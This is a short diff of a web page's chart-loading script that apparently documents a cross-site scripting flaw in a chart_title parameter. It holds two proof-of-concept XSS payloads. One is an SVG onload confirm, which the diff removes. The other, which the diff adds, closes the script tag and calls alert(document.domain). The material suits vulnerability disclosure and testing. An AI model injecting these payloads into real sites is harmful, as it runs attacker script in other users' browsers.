@@ -1,7 +1,3 @@
-<redacted>
-
-url=/chart_data%2Fmetric_charts%2Fsingle_metric.json...<redacted>&chart_title=title
- 
 <script type='text/javascript'>
       jQuery(function($) {
         var loadChart = function() {
@@ -12,7 +8,7 @@ url=/chart_data%2Fmetric_charts%2Fsingle_metric.json...<redacted>&chart_title=ti
             fluid: true,
             loadingOverlay: true,
             snappable: true,
-            chart_title: "<Brute Data-Spy=scroll Data-Target='<Svg OnLoad=(confirm)(1)>'>",
+            chart_title: "</script><script>alert(document.domain)</script>",
             liveChart: false,
             dataApiUrl: '',
             zoom_url: '',
